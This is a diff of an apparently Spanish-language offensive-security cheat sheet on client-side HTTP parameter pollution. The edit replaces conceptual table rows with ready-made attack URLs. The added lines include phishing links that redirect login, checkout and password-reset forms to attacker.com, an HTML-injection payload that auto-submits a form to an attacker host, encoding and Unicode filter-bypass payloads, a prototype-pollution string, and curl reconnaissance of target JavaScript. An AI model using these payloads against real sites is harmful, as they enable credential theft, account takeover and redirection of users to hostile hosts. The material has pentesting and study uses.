@@ -23,21 +23,13 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | Frontend JS reads URL params, builds new URLs / actions. Atacante injects duplicate params → manipulates JS behavior. | DOM-based HPP. |
-| `URLSearchParams.get('a')` | Returns first param value | If JS uses `get()`. |
-| `URLSearchParams.getAll('a')` | Returns array | Different. |
-| `location.search.split('&')` | Manual parse → behavior varies | Custom parser. |
-| Link href manipulation | Frontend builds link from URL params | Combine con OR. |
-| Form action injection | Form action built from params | Phishing chain. |
-| AJAX URL building | `fetch('/api?' + location.search)` | Forwards original con HPP. |
-| OAuth redirect URL | Frontend processes redirect URL | OAuth chain. |
-| Search query forwarding | Frontend re-sends search to backend | Multi-stage. |
-| iframe src manipulation | Per-app | Edge. |
-| Image src dynamic | Image URL with params | Edge. |
-| Combine con XSS | DOM XSS via param confusion | Standard. |
-| postMessage URL building | postMessage data forwarded | Cross-frame. |
-| Service Worker URL routing | SW intercepts and reroutes | PWA. |
-| Custom URL parser | App-specific behavior | Per-app. |
+| Phishing URL: `https://target/?redirect=safe.com&redirect=attacker.com` | Frontend `URLSearchParams.get('redirect')` toma primer (safe), backend procesa último (attacker) | Differential JS vs backend parser. |
+| `https://target/page?next=/dashboard&next=//attacker.com` | Open Redirect via DOM HPP | Frontend lee primer, redirige al último. |
+| Browser console: `new URLSearchParams('a=1&a=2').get('a')` y `.getAll('a')` | Verificar JS parser behavior | Pre-attack analysis. |
+| `https://target/?id=safe&id=<injected_payload>` (XSS via param duplicate) | Frontend lee primer (safe), reflective JS toma último | DOM XSS via HPP. |
+| `https://target/oauth/cb?state=valid&state=attacker` | OAuth state confusion en frontend | Federation chain. |
+| Inspeccionar JS: `curl -s https://target/main.js \| grep -E 'URLSearchParams\|location\.search'` | Identificar parser usado | Source review. |
+| Browser console post-injection: `console.log(new URLSearchParams(location.search).get('a'))` y `getAll('a')` | Verifica behavior live | Validation. |
 ^hpp-client-url
 
 ___
@@ -46,18 +38,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Form action built from URL param | `<form action="${queryParam.action}">` | Direct. |
-| Atacante adds duplicate param | First innocuous, second malicious | Bypass. |
-| Hidden input value duplicate | Hidden field with multiple values | Edge. |
-| Inject form action a attacker | Form submits to atacante's URL | Phishing. |
-| Hijack login form action | Steal credentials | High impact. |
-| Hijack reset password form | Hijack password change | ATO. |
-| Combine con DOM XSS | Atacante adds field via JS | Compound. |
-| Multi-step form param forward | Each step preserves params | Privilege escalation across steps. |
-| Combine con CSRF | CSRF + HPP form override | Multi-vector. |
-| File upload form | Hijack upload destination | Data exfil. |
-| Select option duplicate | Multiple `<option>` con same value | Logic confusion. |
-| Force default selection | If first wins | UI hijack. |
+| Phishing URL: `https://target/login?action=/login&action=https://attacker.com/phish` | Form action built from URL param → submits a attacker | Form action dinámico. |
+| `https://target/?submit_url=safe&submit_url=https://attacker.com/steal` (login form) | Hijack form action → credential theft | High-impact phishing. |
+| Inspeccionar HTML: `curl -s https://target/?test=x \| grep -oE '<form[^>]+action[^>]+>'` | Verificar form action reflejado | Pre-attack. |
+| `https://target/checkout?continue=safe&continue=https://attacker.com/phish` | Hijack post-checkout redirect | Multi-step form chain. |
+| `https://target/reset?next=safe&next=https://attacker.com/fake-reset` | Hijack reset password destination | ATO chain. |
+| `<form><input name="x" value="safe"><input name="x" value="evil">` (HTML inject) | Hidden field duplicate via HTML injection | Combo HTMLi + HPP. |
+| HTML injection con `<form action="https://attacker.com/" id="f"><script>document.forms.f.submit()</script>` | Override form via injection | XSS-adjacent. |
 ^hpp-client-form
 
 ___
@@ -66,18 +53,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| URL-encoded duplicate name | `?a=1&%61=2` (`%61` = `a`) | Frontend filters first, backend decodes second. |
-| Doble encoded | `?a=1&%2561=2` (`%2561` decodes a `%61` then `a`) | Multi-decode. |
-| Unicode equivalent | `?a=1&ａ=2` (full-width `ａ`) | If parser normalizes. |
-| Mixed case | `?a=1&A=2` | Case sensitivity. |
-| URL fragment ignored | `?a=1#&a=2` (after `#` not sent) | NOT useful server-side. |
-| Plus sign vs space | `+` decoded a space | Edge URL form encoding. |
-| Backslash vs forward | `?a=1\&a=2` literal | Edge. |
-| Newline in param value | `?a=value1\na=value2` | Body context. |
-| Tab / control chars | Edge encoding | Per-parser. |
-| BOM bytes | `\xef\xbb\xbf?a=1` | Edge. |
-| Encoded ampersand | `?a=1%26a=2` (literal `&`) | NOT splitting — single value. |
-| Combine con unicode lookalikes | `?Α=1&А=2` (Greek/Cyrillic A) | Visual confusion. |
+| `https://target/?a=safe&%61=evil` (`%61`=`a`) | Frontend filtra `a`, backend decodifica `%61` como `a` | Decode-after-filter differential. |
+| `https://target/?a=safe&%2561=evil` (doble encoded) | Multi-decode chain | Frontend single-decode. |
+| `https://target/?a=safe&ａ=evil` (fullwidth Unicode `a`) | Parser que normaliza Unicode | Lookalike normalization. |
+| `https://target/?a=safe&A=evil` (case differential) | Case-insensitive backend, case-sensitive frontend | Case differential. |
+| `https://target/?Α=safe&А=evil` (Greek `Α` vs Cyrillic `А`) | Visual lookalike Unicode chars | Spoofing combo. |
+| `https://target/?a=safe%2526a%253Devil` (mixed encoding) | Multi-decode chain | Decode pipeline. |
+| `https://target/?a=safe%26a%3Devil` (encoded `&` y `=`) | Single-value when frontend NO decodifica, backend SÍ | Frontend reads raw, backend decoded. |
+| `https://target/?a=safe&%C0%81=evil` (UTF-8 overlong) | Overlong UTF-8 normalization | Edge parser. |
 ^hpp-client-encoded
 
 ___
@@ -86,40 +69,32 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `URLSearchParams.get('a')` | Returns first | Standard JS. |
-| `URLSearchParams.getAll('a')` | Returns array | Explicit multi. |
-| Manual split `'&'` parsing | Behavior varies | Custom code. |
-| jQuery `$.param` | Standard parsing | jQuery-specific. |
-| qs library (Express + frontend) | Array parsing | Common Node frontend. |
-| React Router params | Per-version | Library-specific. |
-| Vue Router params | Same | Same. |
-| Angular ActivatedRoute | Per-version | Same. |
-| Custom hash parsing | `location.hash.slice(1)` parse | Custom. |
-| Service Worker | Cache key may include URL | Edge. |
-| Browser inconsistency | Different browsers parse identically en URL bar but JS parsing varies | Per-browser. |
-| Combine con prototype pollution | `?__proto__[a]=1` parsed via merge | Standard PP. |
-| Combine con DOM XSS | Param value reflected en JS | XSS. |
-| iframe URL inheritance | iframe inherits parent URL | Edge. |
+| Browser console: `new URLSearchParams('a=1&a=2').get('a')` → `'1'` | First-wins en URLSearchParams.get() | Standard browser API. |
+| Browser console: `new URLSearchParams('a=1&a=2').getAll('a')` → `['1','2']` | Array de todos values | Explicit multi-value. |
+| `curl -s https://target/main.js \| grep -E '\\.get\\([\"\x27](\\w+)[\"\x27]\\)'` | Identificar callsites parser | Source review. |
+| `curl -s https://target/main.js \| grep -E 'qs\\.parse\|querystring\\.parse'` | Identificar lib parser usado | Stack-aware. |
+| `https://target/?__proto__[a]=1` (combo Prototype Pollution) | qs library merge → PP via HPP-style | Stack JS vulnerable. |
+| `https://target/?action=update&action=delete` con frontend que reads `action` con `URLSearchParams.get` | First-wins en frontend, backend last-wins | Differential exploitation. |
+| Inspeccionar React Router / Vue Router params parsing en source | Per-version behavior | Library-specific. |
+| Browser DevTools → Network → ver query params como server interpreta | Compare cliente vs server view | Validation. |
 ^hpp-client-js
 
 ### Workflow client-side HPP
 
 ```javascript
-// Vulnerable code (frontend)
+// Vulnerable frontend
 const params = new URLSearchParams(location.search);
-const action = params.get('action');
-const target = params.get('target');
+const action = params.get('action');     // first wins
+const target = params.get('target');     // first wins
 
-// App builds redirect
 location.href = `https://api.target.com/${action}/${target}`;
 
 // Atacante's URL:
 // https://target.com/?action=transfer&action=delete&target=victim&target=attacker
-
-// Behavior:
-// - URLSearchParams.get('action') → 'transfer' (first wins)
-// - URLSearchParams.get('target') → 'victim' (first wins)
-// - But if backend has different parsing → action=delete on attacker
+//
+// Frontend: action='transfer', target='victim'
+// Backend (last-wins): action='delete', target='attacker'
+// → desync exploitation
 ```
 
 ***
